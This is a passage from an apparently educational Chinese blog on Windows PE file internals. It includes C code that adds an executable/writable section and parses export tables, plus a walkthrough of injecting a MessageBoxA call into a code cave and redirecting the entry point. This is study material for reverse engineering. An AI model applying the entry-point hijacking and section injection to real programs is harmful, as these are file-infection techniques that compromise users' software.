sizeof(IMAGE_OPTIONAL_HEADER32));//找到节表的最后位置PIMAGE_SECTION_HEADER pfinal_Section = &amp;(pSection[pFileHeader-&gt;NumberOfSections - 1]);//判断能否插入节表,因为在文件和内存中PE头和DOS头大小不变，直接计算即可DWORD remain_size = (pOptionalHeader-&gt;SizeOfHeaders - pDOSHeader-&gt;e_lfanew - 4 - sizeof(IMAGE_FILE_HEADER) - sizeof(IMAGE_OPTIONAL_HEADER32) - sizeof(IMAGE_SECTION_HEADER) * pFileHeader-&gt;NumberOfSections);if (remain_size &lt; 2 * sizeof(IMAGE_SECTION_HEADER)){printf("位置不够捏，想想其他办法吧~\n");}//修改信息// 初始化新增节信息PVOID pSecName = &amp;pSection[pFileHeader-&gt;NumberOfSections].Name;PDWORD pSecMisc = &amp;pSection[pFileHeader-&gt;NumberOfSections].Misc.VirtualSize;PDWORD pSecVirtualAddress = &amp;pSection[pFileHeader-&gt;NumberOfSections].VirtualAddress;PDWORD pSecSizeofRawData = &amp;pSection[pFileHeader-&gt;NumberOfSections].SizeOfRawData;PDWORD pSecPointerToRawData = &amp;pSection[pFileHeader-&gt;NumberOfSections].PointerToRawData;PDWORD pSecCharacteristic = &amp;pSection[pFileHeader-&gt;NumberOfSections].Characteristics;//名字memcpy(pSecName, ".mycode", 8);//Misc*pSecMisc = 0x1000;//计算VirtualAddress=前一个节的VA+sizeofrawdata或者virtualSize内存对齐大小DWORD Sec_Size = (pfinal_Section-&gt;SizeOfRawData &gt; pfinal_Section-&gt;Misc.VirtualSize) ? pfinal_Section-&gt;SizeOfRawData : pfinal_Section-&gt;Misc.VirtualSize;//内存对齐Sec_Size= (Sec_Size % pOptionalHeader-&gt;SectionAlignment) ? ((Sec_Size / pOptionalHeader-&gt;SectionAlignment) + 1) * pOptionalHeader-&gt;SectionAlignment : Sec_Size;//修改VirtualAddress*pSecVirtualAddress = pfinal_Section-&gt;VirtualAddress + Sec_Size;//修改sizeofRawData*pSecSizeofRawData = 0x1000;//修改PointerDWORD size = pfinal_Section-&gt;SizeOfRawData;DWORD File_Size= (size % pOptionalHeader-&gt;FileAlignment) ? ((size / pOptionalHeader-&gt;FileAlignment) + 1) * pOptionalHeader-&gt;FileAlignment : size;*pSecPointerToRawData = pfinal_Section-&gt;PointerToRawData + File_Size;*pSecCharacteristic = 0xFFFFFFFF;//头部信息,先计算增加的长度在内存和文件拉伸的长度DWORD Sec_ADD = (New_Buffer_Size % pOptionalHeader-&gt;SectionAlignment) ? ((New_Buffer_Size / pOptionalHeader-&gt;SectionAlignment) + 1) * pOptionalHeader-&gt;SectionAlignment : New_Buffer_Size;DWORD File_ADD = pOptionalHeader-&gt;SizeOfImage += Sec_ADD;pFileHeader-&gt;NumberOfSections += 1;*pNewBuffer = pNewTempBuffer;pNewTempBuffer = NULL;return New_File_Size;}void Write_To_Newfile(DWORD New_File_Size, LPVOID pNewBuffer){FILE* fp;fp = fopen(Final_Path, "wb");fwrite(pNewBuffer, New_File_Size, 1, fp);fclose(fp);return ;}void PE_operate(){DWORD new_file_size = 0;PVOID pNewBuffer = NULL;PVOID FileBuffer = NULL;DWORD file_size = 0;DWORD New_File_Size = 0;//打开文件读取信息file_size = Open_File(&amp;FileBuffer);//新增节并且修改信息New_File_Size=Add_Section(FileBuffer,&amp;pNewBuffer,file_size);Write_To_Newfile(New_File_Size, pNewBuffer);}int main(){PE_operate();return 0;}</code></pre><h1 id="打印导出表信息-按名称导出"><a href="#打印导出表信息-按名称导出" class="headerlink" title="打印导出表信息-按名称导出"></a>打印导出表信息-按名称导出</h1><pre class="language-c" data-language="c"><code class="language-c">#define  _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;#include&lt;windows.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#define FilePath "D:\\OneDrive\\桌面\\reverse\\吾爱破解专用版Ollydbg\\DBGHELP.DLL"void ReadFileToBuffer(LPVOID *FileBuffer){LPVOID pTempBuffer;//打开文件并读取到Buffer中FILE* pfile = NULL;pfile = fopen(FilePath, "r");fseek(pfile, 0, SEEK_END);//读取文件大小DWORD file_size = ftell(pfile);//设置到开头进行读取fseek(pfile, 0, SEEK_SET);//先开辟空间pTempBuffer = (void*)malloc(file_size);//读取信息fread(pTempBuffer, file_size, 1, pfile);//如果是一级指针，读取完之后就会被释放掉*FileBuffer = pTempBuffer;pTempBuffer = NULL;fclose(pfile);return ;}/** RVA转FOA* 先看在哪个节区，减去该节区的RVA+该节区的PointerOfRawData*/DWORD RVATOFOA(PIMAGE_SECTION_HEADER pSectionHeader, DWORD RVA,DWORD NumberOfSection){DWORD FOA = 0;for (int i = 0; i &lt; NumberOfSection; i++, pSectionHeader++){//如果小于RVA+节区的大小，说明在节区内if (RVA &lt; pSectionHeader-&gt;VirtualAddress + max(pSectionHeader-&gt;SizeOfRawData, pSectionHeader-&gt;Misc.VirtualSize)){FOA = RVA - pSectionHeader-&gt;VirtualAddress + pSectionHeader-&gt;PointerToRawData;return FOA;}}}void PrintExportTable(LPVOID FileBuffer){PIMAGE_DOS_HEADER pDosHeader = NULL;PIMAGE_NT_HEADERS32 pNtHeader = NULL;PIMAGE_FILE_HEADER pFileHeader = NULL;PIMAGE_OPTIONAL_HEADER32 pOptionalHeader = NULL;PIMAGE_SECTION_HEADER pSectionHeader = NULL;PIMAGE_EXPORT_DIRECTORY pExportTable = NULL;PIMAGE_DATA_DIRECTORY pDataTable= NULL;//读取DLL信息pDosHeader = (PIMAGE_DOS_HEADER)(FileBuffer);pNtHeader = (PIMAGE_NT_HEADERS32)((DWORD)FileBuffer + pDosHeader-&gt;e_lfanew);pFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pNtHeader + 4);pOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pFileHeader + sizeof(IMAGE_FILE_HEADER));pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionalHeader + sizeof(IMAGE_OPTIONAL_HEADER32));//获取导出表基本信息pDataTable = (PIMAGE_DATA_DIRECTORY)(pOptionalHeader-&gt;DataDirectory);printf("导出表的RVA为：%X\n", pDataTable[0].VirtualAddress);printf("导出表的大小为：%X\n", pDataTable[0].Size);//打印导出表DWORD ExportTable_FOA = RVATOFOA(pSectionHeader, pDataTable[0].VirtualAddress,pFileHeader-&gt;NumberOfSections);printf("导出表在文件中的位置为：%X\n", ExportTable_FOA);//获取导出表信息pExportTable = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + ExportTable_FOA);//打印导出表信息，获取DLL名称，导出函数名称表，导出函数地址表，导出函数序号表//先打印导出表按名字导出函数的个数printf("按名称导出的函数个数为：%X\n", pExportTable-&gt;NumberOfFunctions);printf("按名称导出的函数个数为：%X\n", pExportTable-&gt;NumberOfNames);//打印DLL名称，导出函数名称表，导出函数地址表，导出函数序号表DWORD NameFOA = RVATOFOA(pSectionHeader, pExportTable-&gt;Name, pFileHeader-&gt;NumberOfSections);char* nameofdll = (char*)((DWORD)pDosHeader + NameFOA);printf("DLL的名称为：%s\n", nameofdll);DWORD FOAOfName= RVATOFOA(pSectionHeader,pExportTable-&gt;AddressOfNames, pFileHeader-&gt;NumberOfSections);DWORD FOAOfNameOdinals= RVATOFOA(pSectionHeader, pExportTable-&gt;AddressOfNameOrdinals, pFileHeader-&gt;NumberOfSections);DWORD FOAOfFunctions= RVATOFOA(pSectionHeader, pExportTable-&gt;AddressOfFunctions, pFileHeader-&gt;NumberOfSections);printf("文件中导出函数地址表为：%X\n文件中函数名称地址表为：%X\n文件中函数序号地址表为：%X\n", FOAOfFunctions, FOAOfName, FOAOfNameOdinals);int * FuncTable = (int*)((DWORD)pDosHeader + FOAOfFunctions);int* NameTable = (int*)((DWORD)pDosHeader + FOAOfName);short* Ordinals = (short*)((DWORD)pDosHeader + FOAOfNameOdinals);////注意下面是随机打印的//for(int i = 0; i &lt; pExportTable-&gt;NumberOfNames; ++i)//{//printf("导出函数地址为：%X ", RVATOFOA(pSectionHeader, *FuncTable, pFileHeader-&gt;NumberOfSections));////char*name=(char*)pDosHeader + (RVATOFOA(pSectionHeader, *NameTable, pFileHeader-&gt;NumberOfSections));//printf("名称为：%s ", name);////函数序号存储的不是RVA，而是序号,直接解引用即可，但是要注意是short型//printf("函数序号为：%X\n", *Ordinals);//NameTable++;//FuncTable++;//Ordinals++;//}//按函数名称导出char funcname[] = "WinDbgExtensionDllInit";for (int i = 0; i &lt; pExportTable-&gt;NumberOfNames; ++i){char* name = (char*)pDosHeader + (RVATOFOA(pSectionHeader, *NameTable, pFileHeader-&gt;NumberOfSections));//printf("函数名称为：%s\n", name);//如果找到我们的函数名时，先把下标去序号表找，然后取出里面的值，再拿去函数地址表找if (strcmp(funcname, name) == 0){Ordinals += i;printf("函数名称为：%s\n", name);printf("函数序号为：%X\n", *Ordinals);printf("导出函数地址为：%X ", RVATOFOA(pSectionHeader, *(FuncTable+*Ordinals), pFileHeader-&gt;NumberOfSections));break;}else//否则就是按照序号导出的，只需要将{}NameTable++;}return;}void oprate_pe(){LPVOID FileBuffer = NULL;ReadFileToBuffer(&amp;FileBuffer);PrintExportTable(FileBuffer);return ;}int main(){oprate_pe();return 0;}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE文件结构</title>
      <link href="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"/>
      <url>/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="PE文件"><a href="#PE文件" class="headerlink" title="PE文件"></a>PE文件</h1><p>主要有exe、dll、sys文件，这些都是可执行文件</p><p>exe由多个exe文件组成，dll之类的</p><h1 id="PE文件头解析"><a href="#PE文件头解析" class="headerlink" title="PE文件头解析"></a>PE文件头解析</h1><p>在内存中和硬盘中数据几乎是一样的，但是存在差异，且程序开始的位置不同，所以可以知道存储信息的位置是可以改变的</p><p>根据不同的功能分了不同的节，也就是程序不同的块，这样做1、可以节省硬盘空间，在内存中占用空间大于硬盘占用空间（节之间的间隔较小）</p><p>2、节省内存，当程序需要多开的时候，只需要将可读可写的数据段重新复制一份即可，不需要对只读的数据进行复制</p><h2 id="硬盘（文件）对齐和内存对齐"><a href="#硬盘（文件）对齐和内存对齐" class="headerlink" title="硬盘（文件）对齐和内存对齐"></a>硬盘（文件）对齐和内存对齐</h2><p>目的都是为了提升读写的速度</p><p>老的编译器，硬盘对齐是200h个字节<strong>（当不够200h字节，会自动填充）</strong>，内存对齐是1000h个字节，所以PE结构执行（<strong>操作系统运行exe文件</strong>）时会发生拉伸的过程，即在内存中占用空间大于硬盘占用空间</p><p>新的编译器在硬盘和内存都采用1000h，这是因为编译器发展，这样内存和硬盘对齐一样，运行时可以减少运算，这样虽然牺牲了空间，但是缩短了时间</p><h2 id="PE磁盘文件与内存映像结构图"><a href="#PE磁盘文件与内存映像结构图" class="headerlink" title="PE磁盘文件与内存映像结构图"></a>PE磁盘文件与内存映像结构图</h2><p>块表（节表）概括节的基本信息（起始和终止位置，节的大小），DOS头和PE头对当前exe文件做的概要性描述（拉伸完后的大小，堆栈大小），节表存储信息</p><p> <img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/19100019-8692ac67434949cb9ec42764cab75468-1646313270630.jpg"> </p><h2 id="DOS头"><a href="#DOS头" class="headerlink" title="DOS头"></a>DOS头</h2><p>DOS长度确定</p><p>解析exe文件时，先解析前两个字节，并通过DOS头找到exe文件真正开始的地方</p><p>第一个WORD MZSignature（e_magic）-MZ标记</p><p>最后一个LONG AddressOfNewExeHeader（e_lfanew）-指向了PE文件的真正开始地址</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646292642401.png"></p><p>这里的0108表示从文件开始的地方计算0108个字节就是PE结构开始的地方</p><h2 id="NT头"><a href="#NT头" class="headerlink" title="NT头"></a>NT头</h2><p>DOS头和NT头中间是一段空间，可以自由发挥，多与少不确定，我们可以在这一段写入shellcode（ <strong>利用软件漏洞而执行的代码</strong> ），在程序中调用。有地址我们就可以访问和执行</p><p>PE的标记-DWORD Signature-四个字节</p><h3 id="标准PE头-20字节"><a href="#标准PE头-20字节" class="headerlink" title="标准PE头-20字节"></a>标准PE头-20字节</h3><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646295409969.png"></p><p>关键信息</p><p>enum IMAGE_MACHINE Machine-程序运行的CPU型号：0x0 任何处理器 /0x14C 386及后续处理器</p><p>WORD NumberOfSections-文件中存在的节的数量，如果需要新增或者合并节，就要修改这个值</p><p>time_t TimeDateStamp-文件创建时间，编译器填写</p><p><strong>WORD SizeOfOptionalHeader</strong>-可选PE头的大小，32位PE文件默认E0h、64位PE文件默认为F0h  大小可以自定义.</p><p>struct FILE_CHARACTERISTICS Characteristics-每个位有不同的含义，可执行文件值为10F 即0 1 2 3 8位置1 </p><p>这里的102拆成二进制</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646296388161.png"></p><p>勾中即为1</p><h3 id="可选PE头"><a href="#可选PE头" class="headerlink" title="可选PE头"></a>可选PE头</h3><p>结构</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646296662617.png"></p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646296680675.png"></p><p>关键信息</p><p>enum OPTIONAL_MAGIC Magic-说明文件类型：10B 32位下的PE文件、20B 64位下的PE文件</p><p>DWORD SectionAlignment-内存对齐</p><p>DWORD FileAlignment-文件对齐</p><p>DWORD SizeOfCode-所有代码节的和，必须是FileAlignment的整数倍，编译器填的，不会被使用</p><p>DWORD SizeOfInitializedData-已初始化数据大小的和，必须是FileAlignment的整数倍，编译器填的，不会被使用</p><p>DWORD SizeOfUninitializedData-未初始化数据大小的和，必须是FileAlignment的整数倍，编译器填的，不会被使用</p><p><em><strong>DWORD AddressOfEntryPoint-程序入口</strong></em></p><p>DWORD BaseOfCode-代码开始的基址，编译器填的，不会被使用</p><p>DWORD BaseOfData-数据开始的基址，编译器填的，不会被使用</p><p>！！<em><strong>DWORD ImageBase-内存镜像基址</strong></em>（不从0开始是因为需要内存保护）</p><p><em><strong>把文件拖入OD时会断在ImageBase+AddressOfEntryPoint这个地址，也就是OEP</strong></em></p><blockquote><p>程序入口可以修改-加壳</p><p>加壳之后入口点EP（RVA）和OEP（RAW）都会改变，但是内存镜像基址不变</p></blockquote><blockquote><p>内核重载：（有一些软件会通过hook技术，检测是否调用函数）相当于PEloader（加载）-把硬盘文件拷贝到内存中进而执行exe文件，但是在拷贝过程中还会有一个文件的缓冲区，这个缓冲区也是在内存中的。装载到内存时是以ImageBase为起点的</p></blockquote><p>DWORD SizeOfImage-内存中整个PE文件的映射的尺寸，可以比实际的值大，但必须是SectionAlignment的整数倍，也就是PE文件在内存中被拉伸后的大小</p><p>DWORD SizeOfHeaders-所有头+节表按照文件对齐后的大小，否则加载会出错</p><p>DWORD CheckSum-校验和，一些系统文件有要求，用来判断文件是否被修改</p><p>DWORD SizeOfStackReserve-初始化时保留的堆栈大小</p><p>DWORD SizeOfStackCommit-初始化时实际提交的大小</p><p>DWORD SizeOfHeapReserve-初始化时保留的堆的大小</p><p>DWORD SizeOfHeapCommit-初始化时实际提交的大小</p><p>DWORD NumberOfRvaAndSizes-目录项数目</p><h1 id="节表-每个节有28字节的信息"><a href="#节表-每个节有28字节的信息" class="headerlink" title="节表-每个节有28字节的信息"></a>节表-每个节有28字节的信息</h1><p>节表定位-DOS+PE+OPTIONPE</p><p>描述每个节的信息</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646306378425.png"></p><p>节的结构</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646306828500.png"></p><p>BYTE Name[8]是八个字节，不够补’\0’，在内存是0，所以不能使用char*，而要用char [9]，且可以随便改</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646306924262.png"></p><p>第二个成员是union Misc，双字，是该节在没有对齐前的真实尺寸，该值可以不准确（可能被别的软件加工过），但是不会妨碍运行，<strong>里面的成员DWORD VirtualSize-存放PE文件放入内存时的数据宽度，他的值可能大于文件对齐后的数据宽度（SizeofRawData），这是因为未初始化的变量不会被存入文件中</strong></p><p>第三个成员-DWORD VirtualAddress-节区在内存中的相对偏移（拉伸-内存对齐后的），加上ImageBase才是在内存中的真正地址（跟文件中无关）</p><p>第四个成员-DWORD SizeOfRawData-节在文件中对齐后的尺寸</p><p>第五个成员-DWORD PointerToRawData-节区在文件中的偏移,所以.text是从400h开始的（跟内存中无关）</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646309678678.png"></p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646308057578.png"></p><p>第二个和第四个是在调试时使用的，编译完这四个默认为0</p><p>struct SECTION_CHARACTERISTICS Characteristics-节的属性</p><p>最后一个成员struct SECTION_CHARACTERISTICS Characteristics-里面有32位，但不是每一位都用</p><pre class="language-c" data-language="c"><code class="language-c">--&gt; 标志(属性块) 常用特征值对照表：&lt;--[值:00000020h](*包含可执行代码)[值:00000040h](*该块包含已初始化的数据)[值:00000080h](*该块包含未初始化的数据)[值:00000200h][Section contains comments or some other type of information.][值:00000800h][Section contents will not become part of image.][值:00001000h][Section contents comdat.][值:00004000h][Reset speculative exceptions handling bits in the TLB entries for this section.][值:00008000h][Section content can be accessed relative to GP.][值:00500000h][Default alignment if no others are specified.][值:01000000h][Section contains extended relocations.][值:02000000h][Section can be discarded.][值:04000000h][Section is not cachable.][值:08000000h][Section is not pageable.][值:10000000h](*该块为共享块).[值:20000000h](*该块可执行)[值:40000000h](*该块可读)[值:80000000h](*该块可写)</code></pre><h1 id="运行状态"><a href="#运行状态" class="headerlink" title="运行状态"></a>运行状态</h1><p>拉伸完之后还需要进行一些准备步骤</p><p>先把文件对齐后的数据拷贝到内存中，根据SizeofHeades，直接copy，因为头和节表是不会变化的，但是节表后面不一定是节区，这是因为文件对齐和内存对齐不同</p><p>循环赋值节的内容，复制到内存的地方由节表信息里面的VirtualAddress决定，PointerToRawData决定了文件复制到内存的起始位置</p><p>复制数据的大小根据SizeofRawData（Misc也可以，但是如果MIsc存在大量未初始化数据，会变得很大，可能将下一节的信息也copy到内存中）</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646548848907.png"></p><h2 id="根据内存数据存储的位置查找在文件中的位置"><a href="#根据内存数据存储的位置查找在文件中的位置" class="headerlink" title="根据内存数据存储的位置查找在文件中的位置"></a>根据内存数据存储的位置查找在文件中的位置</h2><p>假设内存开始位置是500000，数据在内存存储位置是501234</p><p>1、确定节</p><p>先确定偏移501234-500000</p><p>根据节的不同偏移（VirtualAddress）</p><p>1234&gt;VirtualAddress</p><p>1234&lt;VirtualAddress+Misc.VirtualSize</p><p>2、计算距离节初始位置的长度</p><p>1234-1000=234h</p><p>3、在文件中寻找</p><p>因为在文件中和在内存中距离节初始位置的长度相同，所以地址为400+234h</p><h1 id="代码节空白区添加代码"><a href="#代码节空白区添加代码" class="headerlink" title="代码节空白区添加代码"></a>代码节空白区添加代码</h1><p>MessageBoxA-四个参数，执行后会出现弹窗-一般exe都有这个函数-user32.dll里面</p><p>让程序执行我们的代码，需要先找到OEP，修改为call我们函数的地址，然后再jmp回到原程序的OEP</p><p>call=E8+四个字节，jmp=E9+四个字节</p><p>但是这四个字节不是直接的地址，需要进行计算</p><blockquote><p>真正要跳转的地址=E8这条指令的下一行地址（当前指令地址+5，因为call长度是5）+X（X就是E8后边跟着的四个字节）</p></blockquote><p>push=0x6A</p><p>所以我们要加的程序硬编码 = 6A 00  6A 00  6A 00  6A 00  E8 00 00 00 00 E9 00 00 00 00</p><p>我们加入的代码必须加在拉伸后的文件中，也就是内存中的，因为我们计算的地址是拉伸后的地址</p><h2 id="添加代码过程-文件注入"><a href="#添加代码过程-文件注入" class="headerlink" title="添加代码过程-文件注入"></a>添加代码过程-文件注入</h2><p>1、先看代码空白区能不能填充那十八个字节——（SizeofRawData-VirtualSize）</p><p>2、找到添加的地方，假设我们开始是从1000h开始的，而SizeofRawData是1a0000，所以两者相加就是当前节结束的地址，而在1b0000之前为0的部分是代码块的空白部分</p><p>3、开始填充我们的那十八个字节</p><p>4、算地址，要计算内存对齐的地址，而不是文件对齐的，因为我们需要的是运行时的地址（内存对齐和文件对齐不同）</p><p>先找到MessageBoxA在内存中的地址，在OD里面使用命令bp MessageBoxA，按状态栏的B可以找到内存的地址</p><p>5、填充，注意小端序，E8跟着计算后的地址，E9跟着计算后的OEP（ImageBase+EntryPoint）</p><p>6、将原本的EntryOfPoint改为我们填充数据在内存中的地址</p><h1 id="任意代码节空白区添加代码"><a href="#任意代码节空白区添加代码" class="headerlink" title="任意代码节空白区添加代码"></a>任意代码节空白区添加代码</h1><p>从内存转为硬盘文件计算大小-最后一个节的初始位置+最后一个节的大小</p><h1 id="新增节-添加代码"><a href="#新增节-添加代码" class="headerlink" title="新增节-添加代码"></a>新增节-添加代码</h1><p>新增之后，修改NumberOfSections，节表信息，节表后面必须跟着一定长度的00数据（空白区），所以要计算增加之后SizeofHeaders会不会大于PointerOfRawData，并且在新增节最后加上一个节表信息长度的00</p><p>计算内存偏移VirtualAddress（RVA）时，根据上一个节区的VirtualAddress+（SizofRawData/VirtualSize[谁大加谁]）按照内存对齐后的数</p><p>如果编译器在节表中加入一些数据，而我们不能修改，节表又不能断，只能将NT头前移（加入数据之前的），这样再去添加新的节表信息，就不会占用编译器加入的数据</p><p>当DOS到NT头大小不够开辟一个节表的信息，只能扩充最后一个节</p><h1 id="扩大节-合并节-数据目录"><a href="#扩大节-合并节-数据目录" class="headerlink" title="扩大节-合并节-数据目录"></a>扩大节-合并节-数据目录</h1><p>扩大节：在内存中进行扩大，然后再还原回文件中，还原的时候要修改参数</p><p>1、拉伸到内存</p><p>2、分配新空间N=SizeofImage+Ex</p><p>3、将最后一个节的SizeOfRawdata和VirtualSize改为N</p><p>4、修改SizeofImage</p><p>合并节：合并之后节表有空间进行添加节区</p><p>VirtualSize=SizeofImage-VIrtualAddress</p><blockquote><p>数据目录-里面存储各种表的信息</p></blockquote><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646564515662.png"></p><p>下面介绍几种比较重要的</p><h1 id="DLL-动态链接库和静态链接库"><a href="#DLL-动态链接库和静态链接库" class="headerlink" title="DLL-动态链接库和静态链接库"></a>DLL-动态链接库和静态链接库</h1><p>使用的时候都需要include</p><p>程序编译的过程为将.h和.cpp等文件进行预编译，然后进行编译，再进行汇编，最后链接上（.a/.lib/.so/.dll）成为可执行文件</p><p>静态库、动态库区别来自【链接阶段】如何处理库（处理方式不同来区分），链接成可执行程序。分别称为静态链接方式、动态链接方式</p><h2 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h2><p>使用的时候需要include和#pragma comment(lib,”xxx.lib”)</p><p>因为头文件只包含函数声明，函数实现在lib文件中</p><p>即在链接阶段，将源文件用到的库函数与汇编生成的文件.o等合并（即函数被包含在exe文件中）生成可执行文件</p><p>好处：方便程序移植，因为可执行程序与库函数再无关系，放入任何环境当中都可以执行</p><p>缺点：可执行文件太大（因为包含了库函数），每次库文件升级都需要重新编译源文件，每个可执行程序都会合并库函数，存在很大的重复性，占用空间大</p><h2 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h2><p>两个程序应用一个库，目标文件在内存中只有一份，供所有程序使用，但是可移植性太差，如果两台电脑运行环境不同，动态库存放位置不同，可能会导致程序运行失败</p><h3 id="隐式链接"><a href="#隐式链接" class="headerlink" title="隐式链接"></a>隐式链接</h3><p>1、将dll，lib文件添加到调用文件中</p><p>2、将#pragma comment(lib,”xxx.lib”)添加到调用文件中</p><p>3、加入函数的声明</p><p>extern “C” _declspec(dllimport) _stdcall int Plus(int x,int y);</p><p>导出则为dllexport，dll导出和导入的方式必须一致，即导出的时候使用了_stdcall，导入的时候也应该是__stdcall</p><p>这样的话如果需要修改函数，只需要在dll文件修改即可，程序不用编译</p><h3 id="显示链接"><a href="#显示链接" class="headerlink" title="显示链接"></a>显示链接</h3><p>1、定义函数指针</p><p>typedef int (__stdcall *lpPlus)(int,int);</p><p>2、声明函数指针变量</p><p>lpPlus myPlus</p><p>3、动态加载dll到内存中</p><p>HINSTANCE hModule=LoadLibrary(“DllDemo.dll”);</p><p>4、获取函数地址</p><p>myPlus=(lpPlus)GetProcAddress(hModule,”_Plus@8”);(__stdcall为了区分会自动加符号)，如果导入的时候没加stdcall就不需要加符号，即myPlus=(lpPlus)GetProcAddress(hModule,”Plus”);</p><p>5、调用函数</p><p>int a=myPlus(1,2);</p><h4 id="特别说明"><a href="#特别说明" class="headerlink" title="特别说明"></a>特别说明</h4><p>Handle是代表系统内核的对象，如文件句柄、线程句柄、进程句柄</p><p>HMODULE代表应用程序载入的模块-在内存中拉伸的起始位置</p><p>HINSTANCE在win32是和前一个一样的 win16遗留</p><p>HWND是窗口句柄</p><blockquote><p>上面的都是无符号整数，四个字节</p></blockquote><p>这样做是为了方便区分，操作系统给的</p><h3 id="def文件导出"><a href="#def文件导出" class="headerlink" title="def文件导出"></a>def文件导出</h3><p>为了隐藏函数的名字</p><p>和前面的类似，先创建动态链接库，头文件只需要函数声明</p><p>创建def文件后，在def文件中写入</p><blockquote><p>EXPORTS</p><p>(函数名)                编号</p><p>Plus                    @12——导出序号是12</p><p>在编号后面+NONAME 可以隐藏函数名</p></blockquote><h2 id="dll导出函数的方式"><a href="#dll导出函数的方式" class="headerlink" title="dll导出函数的方式"></a>dll导出函数的方式</h2><p>extern表示是个全局函数，可以供各个其他的函数调用</p><p>声明导出：_declspec(dllexport)</p><p>def文件导出</p><p>dll函数调用</p><p>隐式链接</p><p>包含头文件，载入lib库</p><p>显式链接</p><p>LoadLibary，GetProAddress</p><h1 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h1><p>作用：记载我们写的dll或者exe导出的函数</p><h2 id="导出表重要成员"><a href="#导出表重要成员" class="headerlink" title="导出表重要成员"></a>导出表重要成员</h2><p>1、指向导出表文件名的字符串-DWORD Name</p><p>2、导出函数的起始序号-DWORD Base</p><p>3、导出函数地址表RVA-DWORD AddressOfFunctions</p><p>4、函数名称地址表RVA-DWORD AddressOfNames</p><p>5、函数序号地址表RVA-DWORD AddressOfNameOrdinals</p><h2 id="定位导出表"><a href="#定位导出表" class="headerlink" title="定位导出表"></a>定位导出表</h2><p>1、找出导出表RVA的偏移</p><p>首先我们要在数据目录的导出表信息的第一项，也就是导出表地址的RVA偏移是多少</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646621065982.png"></p><p>可以看出c000h是RVA偏移，大小是164个字节</p><h3 id="判断属于哪一个节"><a href="#判断属于哪一个节" class="headerlink" title="判断属于哪一个节"></a>判断属于哪一个节</h3><p>根据节区的VIrtualAddress判断</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646621026524.png"></p><p>所以可以知道在.edata节</p><h3 id="算出FOA位置"><a href="#算出FOA位置" class="headerlink" title="算出FOA位置"></a>算出FOA位置</h3><p>我们知道是在.rdata节的，可以算出FOA</p><p>FOA=RVA-节区的RVA（VirtualAddress）+节.PointerOfRawData</p><p>计算发现为8200h</p><h3 id="通过FOA找到导出表位置"><a href="#通过FOA找到导出表位置" class="headerlink" title="通过FOA找到导出表位置"></a>通过FOA找到导出表位置</h3><p>找到后根据前面的导出表大小可以知道导出表的范围</p><p>跳转过去即可</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646621157564.png"></p><h2 id="导出表的存储方式"><a href="#导出表的存储方式" class="headerlink" title="导出表的存储方式"></a>导出表的存储方式</h2><p>一个导出表大小为0x28个字节，也就是两行半</p><p>分段讲解</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646621661598.png"></p><p>前面十二个字节没用，就不讲了</p><h3 id="Dword-Name"><a href="#Dword-Name" class="headerlink" title="Dword Name"></a>Dword Name</h3><p>绿框的4个字节存储的是dll名称的RVA，想查看的话，可以计算FOA，和前面一样的，得到8250地址存储的是我们的dll名称，以00结尾</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646621843130.png"></p><h3 id="Dword-Base"><a href="#Dword-Base" class="headerlink" title="Dword Base"></a>Dword Base</h3><p>导出函数的起始序号</p><p> DLL导出的函数如果给序号了，那么就从这个序号开始</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646622459296.png"></p><h3 id="Dword-NumberOfFunctions-所有的导出函数的个数"><a href="#Dword-NumberOfFunctions-所有的导出函数的个数" class="headerlink" title="Dword NumberOfFunctions-所有的导出函数的个数"></a>Dword NumberOfFunctions-所有的导出函数的个数</h3><p>前四个</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646622410901.png"></p><h3 id="DWORD-NumberOfNames-以名字（有名字的）导出的函数的个数"><a href="#DWORD-NumberOfNames-以名字（有名字的）导出的函数的个数" 